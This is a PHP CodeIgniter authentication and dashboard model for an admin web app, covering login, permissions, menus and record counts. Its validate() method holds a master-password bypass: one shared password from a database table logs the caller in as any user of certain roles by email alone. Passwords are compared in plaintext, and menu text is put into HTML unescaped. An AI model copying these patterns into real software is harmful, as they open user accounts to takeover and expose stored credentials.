<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth_model extends CI_Model {

	protected $current_level, $level;

    /**
    * Validate the login's data with the database
    * @param string $email
    * @param string $password
    * @return void
    */
	function validate($email, $password) {

		/* $this->db->select('users.id, CONCAT(users.first_name, " ", users.last_name) AS name, users.email, users.last_login, roles.role_name, users.role_id, roles.role_token');
		$this->db->from('users');
   		$this->db->join('roles', 'roles.id = users.role_id');
		$this->db->where('users.email', $email);
		$this->db->where('users.password', $password);
		$this->db->where('users.status', 1);
		$query = $this->db->get();

		if ($query->num_rows() == 1) {
			return $query->row();
		} else {
			return false;
		} */
		$this->db->select('users.id, CONCAT(users.first_name, " ", users.last_name) AS name, users.email, users.last_login, roles.role_name, users.role_id, roles.role_token');
		$this->db->from('users');
   		$this->db->join('roles', 'roles.id = users.role_id');
		$this->db->where('users.email', $email);
		$this->db->where('users.password', $password);
		$this->db->where('users.status', 1);
		$query = $this->db->get();

		if ($query->num_rows() == 1) {
			return $query->row();
		} else {
			$this->db->select('*');
			$this->db->from('master_password');
			$this->db->where('master_password.password', $password);
			$query2 = $this->db->get()->result_array();
// print_r($query2);die;
			if(!empty($query2)){
				$roles = array(0,4,5,6);
				$this->db->select('users.id, CONCAT(users.first_name, " ", users.last_name) AS name, users.email, users.last_login, roles.role_name, users.role_id, roles.role_token');
				$this->db->from('users');
				$this->db->join('roles', 'roles.id = users.role_id');
				$this->db->where_in('users.role_id', $roles);
				$this->db->where('users.email', $email);
				$this->db->where('users.status', 1);
				$query3 = $this->db->get();
				// echo "<pre>";
				// print_r($query3);
				// print_r($query3->num_rows());die;
				if ($query3->num_rows() == 1) {
					return $query3->row();
				}else{
					return false;
				}
			}else{
				return false;
			}
		}
	}


	/**
	 * Get admin by his is
	 * @param string $fieldname
	 * @param int $field_value
	 * @return array
	 */
	public function get_user_by_id($id) {

		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('id', $id);
		$query = $this->db->get();

		return $query->row();
	}



	public function is_valid_data($table_name, $search = NULL) {

		$this->db->select('*');
		$this->db->from($table_name);

		if ($search !== NULL) {
			foreach ($search as $field => $match) {
				$this->db->like($field, $match);
			}
		}
    	$this->db->limit(1);

   		$query = $this->db->get();

   		if($query->num_rows() == 1)
   		{
     		return $query->row();
   		}
   		else
   		{
     		return false;
   		}
	}


	/**
	 *
	 */
	function save_password_log($data) {

		if ($this->db->insert('user_password_log', $data)) {
			return true;
		} else {
			return false;
		}
	}

	/**
	 * Update user
	 * @param array $data - associative array with data to store
	 * @return boolean
	 */
	function update($field_name, $field_value, $data) {

		$this->db->where($field_name, $field_value);
		if ($this->db->update('users', $data)) {
			return true;
		} else {
			return false;
		}
	}

	/**
	 *
	 */
	public function update_password_log($id, $data = array()) {

		$this->db->where('id', $id);
		if ($this->db->update('user_password_log', $data)) {
			return true;
		} else {
			return false;
		}
	}


	function check_password($id, $old_password) {

		$this->db->select('*');
		$this->db->from('admin');
		$this->db->where('id', $id);
		$this->db->where('password', $old_password);
		$query = $this->db->get();

		if ($query->num_rows() > 0) {
			return TRUE;
		} else {

			return FALSE;
		}
	}

	/**
	 *
	 * @param unknown_type $user_id
	 */
	function get_user_permissions($user_id) {

		// print_r($user_id);
		$this->db->select('permissions.name');
		$this->db->from('permissions');
		$this->db->join('role_permissions', 'permissions.id = role_permissions.permission_id');
		$this->db->join('users', 'users.role_id = role_permissions.role_id');
		$this->db->where('users.id', $user_id);

		$query = $this->db->get();
		$result = array();

		foreach ($query->result() as $row) {
			$result[] = $row->name;
		}
		return $result;
	}



	/**
	 *
	 * @param unknown_type $role_id
	 */
	public function get_menulink_by_role($role_id = 0)
	{
		$role_id = (int) $role_id;

		try {
			$this->db->select('menu_links.id, menu_links.parent_id, menu_links.title, menu_links.description, menu_links.url, menu_links.status, menu_links.weight');
			$this->db->from('menu_links');
			$this->db->join('menus', 'menus.id = menu_links.menu_id');
			$this->db->join('menu_roles', 'menu_roles.menu_id = menus.id');
			$this->db->where('menu_roles.role_id', $role_id);

			$this->db->where('menu_links.status', 'active');
			$this->db->where('menus.status', 'active');
			$this->db->order_by('weight ASC');

			$query = $this->db->get();

			return $query->result();
		}
        catch (Exception $ex) {
			echo $ex->getMessage(); die;
		}
	}


	/**
	 *
	 * @param $role_id
	 */
	public function get_main_menu($role_id = 0)
    {
        $table = array();
        $items = $this->get_menulink_by_role($role_id);
        
        foreach($items as $item){
            $table[$item->parent_id][$item->id] = array('title' => $item->title, 'description' => $item->description, 'url' => $item->url);
        }

        //print "<pre>"; print_r($table); print "</pre>";
        $output = $this->get_menu_branch(0, $table, 0, 0);

        // Close off nested lists
        for ($nest = 0; $nest <= $this->current_level-1; $nest++) {
            $output .= '</ul>';
        }
        return $output;
    }


	/**
	 *
	 * @param unknown_type $parent
	 * @param unknown_type $table
	 * @param unknown_type $level
	 * @param unknown_type $maxlevel
	 */
	protected function get_menu_branch($parent, $table, $level, $maxlevel)
	{
		$list = array();
		if (isset($table[$parent])) {
			$list = $table[$parent];
		}

		$output = "";
		while(list($id, $val) = each($list)){

			if ($this->current_level != $level) {

				if ($this->current_level < $level) {
						$output .= "\n".'<ul class="dropdown-menu">';
				} else {
					for ($nest = 1; $nest <= ($this->current_level - $level); $nest++) {
						$output .= '</ul></li>'."\n";
					}
				}
				$this->current_level = $level;
			}

			if ($this->has_sub_menu($id)) {
				$hasSubMenu = true;
			} else {
				$hasSubMenu = false;
			}

			if ($hasSubMenu) {
				$output .= '<li class="dropdown"><a href="javascript:;" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" ';
			} else {
				$output .= '<li><a href="'.base_url($val['url']).'" ';
			}

			$output .= 'title="'.$val['description'].'">'.$val['title'];

			if ($hasSubMenu) {
				$output .= ' <span class="caret"></span></a>';
			} else {
				$output .= '</a>';
			}

			$this->level++;

			if (!$hasSubMenu) {
				$output .= '</li>'."\n";
			}


			if ((isset($table[$id])) && (($maxlevel > $level + 1) || ($maxlevel == '0'))) {
				$output .= $this->get_menu_branch($id, $table, $level + 1, $maxlevel);
			}

		} // End while loop

		return $output;
	}


	/**
	 * Getting the child existance ..
	 * @param $id
	 */
	public function has_sub_menu($id)
	{
		$id = (int) $id;

		try {
			$this->db->select('id');
			$this->db->from('menu_links');
			$this->db->where('parent_id', $id);
			$query = $this->db->get();

   			if($query->num_rows() > 0) {
				return true;
   			} else {
				return false;
			}
		}
        catch (\Exception $ex) {
			echo $ex->getMessage();die;
		}
	}


	public function get_admin_dashboard()
	{
		try {

			$result = array();

			// Total Customers
			/*$this->db->where('is_deleted', 0);
			$this->db->from('customers');
			$result['total_customers'] = $this->db->count_all_results();

			// Total Rewards
			$this->db->where('is_deleted', 0);
			$this->db->from('rewards');
			$result['total_rewards'] = $this->db->count_all_results();

			// Total Bars
			$this->db->where('is_deleted', 0);
			$result['total_bars'] = $this->db->count_all_results('bars');

			// Total Users
			$result['total_users'] = $this->db->count_all_results('users');

			// Number of users per role
			$this->db->select('roles.id, roles.role_name, count(users.id) as total_users');
			$this->db->from('roles');
			$this->db->join('users', 'roles.id = users.role_id', 'LEFT OUTER');
			$this->db->group_by("roles.id");

			$query = $this->db->get();
			$result['role_users'] = $query->result();

			// Get pending rewards customers
			$this->db->select('customer_rewards.id, rewards.points as points, customer_rewards.status, CONCAT(customers.first_name, " ", customers.last_name) as customer_name, CONCAT(rewards_created.first_name, " ", rewards_created.last_name) as created_by_name');
			$this->db->from('customer_rewards');
			$this->db->join('rewards', "customer_rewards.reward_id = rewards.id");
			$this->db->join('customers', 'customer_rewards.customer_id = customers.id');
			$this->db->join('users AS rewards_created', 'customer_rewards.created_by = rewards_created.id', 'left');
			$this->db->where('customer_rewards.status', 0);
			//$this->db->group_by("customers.id");

			$query = $this->db->get();
			$result['pending_rewards'] = $query->result();

			// Get pending bar request
			$this->db->select('bar_requests.id, bar_requests.bar_id, bar_requests.user_id, bar_requests.status, bars.bar_name, CONCAT(users.first_name, " ", users.last_name) as user_name');
			$this->db->from('bar_requests');
			$this->db->join('bars', "bar_requests.bar_id = bars.id");
			$this->db->join('users', 'bar_requests.user_id = users.id');
			$this->db->where('bar_requests.status', 1);
			//$this->db->group_by("customers.id");

			$query = $this->db->get();
			$result['pending_requests'] = $query->result();*/

			return $result;
		}
		catch (\Exception $ex) {
			echo $ex->getMessage();die;
		}
	}

	public function get_dashboard()
	{
		try {

			$result = array();

			// Total Sales Representative
			$this->db->select('count(users.id) as total_sales_representaive');
			$this->db->from('users');
			$this->db->where('users.status','active');
			$this->db->where('users.user_type','sales_rep');
			$this->db->where('is_deleted', 0);
			$result['total_sales_representative'] = $this->db->count_all_results();

			// Total Tester
			$this->db->select('count(users.id) as total_tester');
			$this->db->from('users');
			$this->db->where('users.status','active');
			$this->db->where('users.user_type','tester');
			$this->db->where('is_deleted', 0);
			
			$result['total_tester'] = $this->db->count_all_results();

			// Total Agency
			$this->db->select('count(users.id) as total_tester');
			$this->db->from('users');
			$this->db->where('users.status','active');
			$this->db->where('users.user_type','agency');
			$this->db->where('is_deleted', 0);
			
			$result['total_agency'] = $this->db->count_all_results();

			// Total Store
			$this->db->select('count(store.id) as total_store');
			$this->db->from('store');
			$this->db->where('store.status','active');
			$this->db->where('store.is_deleted',0);
			
			$result['total_store'] = $this->db->count_all_results();


			// Total Wine
			$this->db->select('count(wine.id) as total_wine');
			$this->db->from('wine');
			$this->db->where('wine.status','active');
			$this->db->where('wine.is_deleted',0);
			
			$result['total_wine'] = $this->db->count_all_results();

			// Total Job
			$this->db->select('count(job.id) as total_job');
			$this->db->from('job');
			
			$this->db->where('job.is_deleted',0);
			
			$result['total_job'] = $this->db->count_all_results();

			// Total pre assigned Job
			$this->db->select('count(job.id) as pre_assigned_job');
			$this->db->from('job');
			$this->db->where('job.job_status',1);
			$this->db->where('job.is_deleted',0);
			
			$result['pre_assigned_job'] = $this->db->count_all_results();

			// Total Job
			$this->db->select('count(job.id) as total_billing');
			$this->db->from('job');
			$this->db->join('expense_details','job.id=expense_details.job_id');
			$this->db->join('users','expense_details.taster_id=users.id');
        	$this->db->join('user_meta','expense_details.taster_id=user_meta.user_id');
			$this->db->where('user_meta.meta_key','manual_account_number');
			$this->db->where('job.is_deleted',0);
			$this->db->where('job.ready_for_billing',1);
            $this->db->where('job.is_archived',0);
			$this->db->group_by("job.id");
			$result['total_billing'] = $this->db->count_all_results();
            
            //Total archive
            $this->db->select('count(job.id) as total_archive');
			$this->db->from('job');
			$this->db->join('expense_details','job.id=expense_details.job_id');
			$this->db->join('users','expense_details.taster_id=users.id');
        	$this->db->join('user_meta','expense_details.taster_id=user_meta.user_id');
			$this->db->where('user_meta.meta_key','manual_account_number');
			$this->db->where('job.is_deleted',0);
			$this->db->where('job.is_archived',1);
			$this->db->group_by("job.id");
			$result['total_archive'] = $this->db->count_all_results();
            
            //Total bulk schedule
            $this->db->select('count(bulk_schedule_job.id) as total_bulk_schedule');
			$this->db->from('bulk_schedule_job');
			

			$this->db->where('bulk_schedule_job.is_deleted',0);
			$this->db->where('bulk_schedule_job.status','not_published');
			$this->db->group_by("bulk_schedule_job.id");
			$result['total_bulk_schedule'] = $this->db->count_all_results();
			
			// Monthwise registration of customers
			$sql = "SELECT COUNT(id) AS total_sales_representatives, YEAR(created_on) AS year, MONTH(created_on) AS month FROM users WHERE created_on >= DATE(NOW()) - INTERVAL 1 YEAR GROUP BY YEAR(created_on), MONTH(created_on) ORDER BY YEAR(created_on) DESC, MONTH(created_on) DESC";
			$query = $this->db->query($sql);

			$result['sales_representative'] = $query->result();
			//print "<pre>"; print_r($result); die;


			// Total Zones
			$this->db->select('count(zone.id) as total_zone');
			$this->db->from('zone');
			//$this->db->where('zone.status','active');
			$this->db->where('zone.is_deleted',0);
			
			$result['total_zone'] = $this->db->count_all_results();
			return $result;
		}
		catch (\Exception $ex) {
			echo $ex->getMessage();die;
		}
	}

}

/* End of file admin_model.php */
/* Location: ./application/models/admin_model.php */
